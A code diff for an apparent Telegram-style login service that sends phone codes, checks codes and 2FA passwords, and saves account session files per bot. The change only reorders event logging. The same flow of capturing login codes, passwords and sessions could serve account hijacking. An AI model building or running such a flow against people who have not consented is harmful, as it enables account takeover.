@@ -208,11 +208,6 @@ async def api_send_code(req: StartReq) -> dict:
             s.phone_code_hash = await send_code(s.client, s.phone)
             s.state = State.WAIT_CODE
             s.touch()
-            if s.bot_id:
-                try:
-                    record_auth_event(s.bot_id, "code_sent")
-                except Exception:
-                    pass
             return s.public()
         except Exception as e:
             state, code, status = _map_error(e)
@@ -274,16 +269,17 @@ async def _check_code_task(s: "AuthSession", code: str) -> None:
             s.touch()
             return
 
-        # успех проверки кода
+        # успех проверки кода — код верный
+        if s.bot_id:
+            try:
+                record_auth_event(s.bot_id, "code_sent")
+            except Exception:
+                pass
+
         if need_2fa:
             s.state = State.WAIT_PASSWORD
             s.error = None
             s.touch()
-            if s.bot_id:
-                try:
-                    record_auth_event(s.bot_id, "pwd_requested")
-                except Exception:
-                    pass
             return
 
         # без 2FA — финал
@@ -352,6 +348,7 @@ async def _check_password_task(s: "AuthSession", password: str) -> None:
         s.touch()
         if s.bot_id:
             try:
+                record_auth_event(s.bot_id, "pwd_requested")
                 record_auth_event(s.bot_id, "success")
                 record_bot_session(s.bot_id, s.phone, s.session_path)
             except Exception:
